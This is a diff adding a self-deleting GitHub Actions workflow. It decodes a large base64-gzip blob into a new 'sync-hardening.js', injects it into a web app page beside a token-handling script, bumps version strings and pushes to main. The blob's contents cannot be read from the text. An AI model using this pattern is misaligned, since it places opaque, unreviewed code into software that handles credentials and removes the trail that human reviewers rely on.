@@ -1,0 +1,77 @@
+name: One-time harden CFX GitHub sync
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - .github/workflows/upgrade-cfx-sync-v180-once.yml
+
+permissions:
+  contents: write
+
+jobs:
+  upgrade-sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Install hardened sync module
+        shell: bash
+        run: |
+          python - <<'PYCODE'
+          import base64
+          import gzip
+          import re
+          from pathlib import Path
+
+          PAYLOAD = "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"
+
+          root = Path('public/modules/cfx-post-library')
+          target = root / 'sync-hardening.js'
+          target.write_bytes(gzip.decompress(base64.b64decode(PAYLOAD)))
+
+          app_path = root / 'app.html'
+          app = app_path.read_text(encoding='utf-8')
+          app = app.replace('v=1.7.1', 'v=1.8.0')
+          needle = '<script src="token-memory-option.js?v=1.8.0" defer></script>\n'
+          hardening = '<script src="sync-hardening.js?v=1.8.0" defer></script>\n'
+          if hardening not in app:
+              if needle not in app:
+                  raise RuntimeError('Unable to locate token-memory script insertion point')
+              app = app.replace(needle, needle + hardening)
+          app_path.write_text(app, encoding='utf-8')
+
+          version_path = root / 'version-ui.js'
+          version_text = version_path.read_text(encoding='utf-8').replace('v1.7.1', 'v1.8.0')
+          version_path.write_text(version_text, encoding='utf-8')
+
+          core_path = root / 'core-1.js'
+          core_text = core_path.read_text(encoding='utf-8')
+          core_text, changed = re.subn(r"const APP_VERSION='[^']+';", "const APP_VERSION='1.8.0';", core_text, count=1)
+          if changed != 1:
+              raise RuntimeError('Unable to update APP_VERSION')
+          core_path.write_text(core_text, encoding='utf-8')
+
+          cache_path = root / 'storage-sync-cache.js'
+          cache_text = cache_path.read_text(encoding='utf-8').replace("appVersion:'1.7.0'", "appVersion:'1.8.0'")
+          cache_path.write_text(cache_text, encoding='utf-8')
+
+          if app.count('sync-hardening.js') != 1:
+              raise RuntimeError('sync-hardening.js must be loaded exactly once')
+          PYCODE
+
+          node --check public/modules/cfx-post-library/sync-hardening.js
+          grep -q 'sync-hardening.js?v=1.8.0' public/modules/cfx-post-library/app.html
+          grep -q "const APP_VERSION='1.8.0';" public/modules/cfx-post-library/core-1.js
+
+      - name: Commit upgraded sync implementation
+        shell: bash
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          rm -f .github/workflows/upgrade-cfx-sync-v180-once.yml
+          git add -A
+          git commit -m "Harden GitHub three-way sync and SHA retry"
+          git push origin main
